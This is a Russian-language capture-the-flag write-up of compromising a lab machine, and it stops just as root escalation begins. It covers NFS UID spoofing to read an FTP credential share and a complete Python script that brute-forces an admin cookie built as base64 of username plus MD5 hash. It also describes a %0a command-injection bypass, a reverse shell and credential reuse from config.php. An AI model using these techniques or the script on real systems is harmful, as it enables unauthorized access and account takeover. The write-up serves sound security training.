###H 3 Доступ к системе
1. По классике начинаем со скана портов
```
sudo nmap -sV -sC 10.112.138.240
[sudo] password for olya:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 19:36 +0300
Nmap scan report for 10.112.138.240
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|http-title: Home
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38982/udp   mountd
|   100005  1,2,3      42137/tcp6  mountd
|   100005  1,2,3      43484/tcp   mountd
|   100005  1,2,3      56572/udp6  mountd
|   100021  1,3,4      33016/udp6  nlockmgr
|   100021  1,3,4      33280/tcp6  nlockmgr
|   100021  1,3,4      36280/tcp   nlockmgr
|   100021  1,3,4      58799/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Посмотрим сайт на 80 порту. Сразу посмотрим директории через ффаф. Там тоже ничего интересного 

<img width="1025" height="622" alt="image" src="https://github.com/user-attachments/assets/d308331d-4fa5-430b-b7bd-b6b31ac3908d" />

Сам сайт небольшой - стандартное поле ввода и админская панель, к которой доступа у нас нет(only the admin can access this page). 
Прогнала через форму логина sqlmap, посмотрела запросы через бурп, быстро просмотрела код страничек - ничего интересного.

<img width="557" height="193" alt="image" src="https://github.com/user-attachments/assets/852c4695-6bfa-4597-a369-c9eb8ff42e4c" />

Но у нас есть форма регистрации и понимание, что нам вероятнее всего нужно получить доступ к аккаунту админа. И вот мы проверяем форму регистрации
и получаем приятный результат (сейчас увидела, что корректность юзернейма подтверждается и при попытке залогиниться). Но брутфорсить не выйдет из-за ограничения
на ввод пароля (5 попыток)

<img width="651" height="259" alt="image" src="https://github.com/user-attachments/assets/fd0132c8-ba96-44cb-abfc-f7e110d12672" />

Возвращаемся к открытым портам. Есть возможность посмотреть сетевую файловую систему (nfs), воспользуемся ей

``` Show mount -e 10.112.138.240 ```

Там лежит /share/mount *. Монтируем к себе. Открыть не удалось даже под рутом - включена защита nsf, а файл принадлежит юзеру 1003. Попробуем создать такого же пользователя

```sudo useradd -u 1003 test```

Открываем папку и понимаем, что никто в /etc/exports хотя бы all_squash не настроил. От пользователя test читаем содержимое папки и получаем креды от ftp. Логинемся

<img width="640" height="432" alt="image" src="https://github.com/user-attachments/assets/26d9f605-bae1-4c0b-861c-c9790cdbcf59" />

Выгружаем все файлы к себе. И в итоге мы получили файл с 150 паролями и такое сообщение от админа

<img width="1395" height="120" alt="image" src="https://github.com/user-attachments/assets/2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6" />

Понимаем, что брутфорс нам недоступен. Я также попробовала xxe инъекцию из-за application/xml в content-type, но сервер все-таки фильтрует подобное. 
Из-за этого я решила вернуться к созданному аккаунту на сайте, в котором по сути ничего и не было (машина простая, поэтому такой распорядок вещей вполне можно принимать за намек). И что у нас там есть? Конечно, куки. Попробуем посмотреть на них.

<img width="287" height="255" alt="image" src="https://github.com/user-attachments/assets/8d4e4304-f812-46e8-bbd7-a784f0bbd5a3" />

Можно предположить, что куки - закодированный юзернейм + хеш (походу MD5). Проверила - так и оказалось. 

Пишем код для брутфорса кук

```
import requests
import base64
import hashlib
import time
import argparse
from urllib.parse import quote

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def brute_force(url, username, password_list, delay, cookie_name,
                success_str, fail_str, status_code, extra_headers):
    total = len(password_list)
    print(f"URL: {url}")
    print(f"Пользователь: {username}")
    print(f"Имя cookie: {cookie_name}")
    print(f"Всего паролей: {total}")
    if success_str:
        print(f"УСПЕХ: в ответе должна быть строка '{success_str}'")
    elif fail_str:
        print(f"УСПЕХ: в ответе НЕ должно быть строки '{fail_str}'")
    elif status_code:
        print(f"УСПЕХ: HTTP статус должен быть {status_code}")
    else:
        print("УСПЕХ: отсутствие строки 'Welcome Guest' (по умолчанию)")
    print()

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
    }
    for h in extra_headers:
        if ':' in h:
            key, val = h.split(':', 1)
            headers[key.strip()] = val.strip()
        else:
            print(f"Игнорируем некорректный заголовок: {h}")

    for i, pwd in enumerate(password_list, start=1):
        pwd_md5 = md5(pwd)
        auth_str = f"{username}:{pwd_md5}"
        b64 = base64.b64encode(auth_str.encode()).decode()
        cookie_val = quote(b64)
        cookies = {cookie_name: cookie_val}

        print(f"\r[{i}/{total}] {pwd[:30]}{'...' if len(pwd)>30 else ''}", end='', flush=True)

        try:
            resp = requests.get(url, cookies=cookies, headers=headers, timeout=5, allow_redirects=False)

            success = False
            if success_str:
                if success_str in resp.text:
                    success = True
            elif fail_str:
                if fail_str not in resp.text:
                    success = True
            elif status_code:
                if resp.status_code == status_code:
                    success = True
            else:
                if "Welcome Guest" not in resp.text:
                    success = True

            if success:
                print(f"\n\n✅ ПАРОЛЬ НАЙДЕН: {pwd}")
                print(f"Cookie: {cookie_val}")
                print(f"HTTP статус: {resp.status_code}")
                if resp.status_code == 302:
                    print(f"Location: {resp.headers.get('Location', '')}")
                print("\n--- Первые 500 символов ответа ---")
                print(resp.text[:500])
                print("-----------------------------------")
                return pwd
        except requests.RequestException as e:
            print(f"\nОшибка: {e}")
            break

        time.sleep(delay)

    print("\n❌ Пароль не найден.")
    return None

def load_passwords(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Ошибка: файл '{file_path}' не найден.")
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Гибкий брутфорс cookie для веб-приложения")
    parser.add_argument("url", help="Целевой URL (например, http://10.112.138.240)")
    parser.add_argument("username", help="Имя пользователя")
    parser.add_argument("passfile", help="Файл со списком паролей (по одному на строку)")

    parser.add_argument("--delay", type=float, default=0.1, help="Задержка между запросами (сек), по умолчанию 0.1")
    parser.add_argument("--cookie-name", default="PHPSESSID", help="Имя cookie (по умолчанию PHPSESSID)")
    parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок в формате 'Key: Value' (можно несколько)")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--success", dest="success_str", help="Строка, которая ДОЛЖНА присутствовать в ответе при успехе")
    group.add_argument("--fail", dest="fail_str", help="Строка, которая НЕ ДОЛЖНА присутствовать в ответе при успехе")
    group.add_argument("--status", type=int, dest="status_code", help="HTTP статус код, который означает успех (например, 302)")

    args = parser.parse_args()

    passwords = load_passwords(args.passfile)
    brute_force(
        url=args.url,
        username=args.username,
        password_list=passwords,
        delay=args.delay,
        cookie_name=args.cookie_name,
        success_str=args.success_str,
        fail_str=args.fail_str,
        status_code=args.status_code,
        extra_headers=args.header
    )
```
Запускаем: ```python script.py http://10.112.138.240 admin passwords.txt --fail "Welcome Guest"```
Находим нужный пароль и заходим в админский аккаунт, получаем доступ к командной строке. Очевидно, что нужна cmd инъекция

<img width="915" height="385" alt="image" src="https://github.com/user-attachments/assets/f8d80b59-d692-4e9d-8365-3a2272fbcba8" />

Фильтр обходится через %0a. Далее опрокидываем себе реверс шелл и получаем шелл

<img width="1347" height="212" alt="image" src="https://github.com/user-attachments/assets/d1ef2d72-d692-4a90-a311-3890220a4000" />

<img width="761" height="51" alt="image" src="https://github.com/user-attachments/assets/ca340642-8216-450f-813c-1911b5c50c24" />

### Взятие юзера
Мы оказываемся в системе с правами пользователя wwww-data в каталоге с файлами типа config.php, где вполне могут быть оставлены креды. Читаем их - находим креды рика
кстати, в пароле отсылка на рика эстли - удивительно, как создатели машин любят этот мем

```su - rick``` 

Вводим пароль из файла, и вот мы вошли в систему под риком, где наконец можем прочитать флаг user.txt. 

### Взятие рута
машина, честно сказать, вышла муторная, поэтому как же я рада была увидеть это после ``` sudo -l ```. (господи, скажите, что на тачке есть компилятор)

<img width="659" height="125" alt="image" src="https://github.com/user-attachments/assets/d13d4018-c57f-46a7-b4fd-c0b337eea362" />

мы можем подгружать переменные окружения перед выполнением скрипта и, собственно, может исполнять парочку от рута - супер.
создаем динамическую библиотеку
